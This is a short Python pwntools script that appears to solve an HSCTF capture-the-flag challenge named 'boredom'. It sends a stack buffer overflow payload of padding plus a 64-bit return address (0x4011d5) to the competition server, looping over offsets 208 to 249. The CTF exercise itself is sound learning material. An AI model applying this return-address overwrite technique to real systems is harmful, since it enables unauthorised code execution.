#!/usr/bin/python
from pwn import *

for i in range(208, 250):
	r = remote("pwn.hsctf.com", 5002)
	# r = process("./boredom")

# offset was different on server so using a loop

	payload = "A"*i     # flag at i=208
	payload += p64(0x4011d5)

	r.sendline(payload)
	r.interactive()